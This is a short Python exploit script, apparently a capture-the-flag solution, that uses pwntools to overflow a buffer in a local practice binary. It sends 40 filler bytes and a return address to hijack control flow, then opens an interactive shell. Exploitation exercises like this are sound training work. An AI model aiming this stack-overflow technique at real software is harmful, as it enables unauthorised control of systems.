from pwn import *

p = process('./01-bof-74f8a85447bc51c4fd641dcdd05c66b3b09a2ecd')

p.sendline('a' * 40 + p64(0x0000000000400686))

p.interactive()
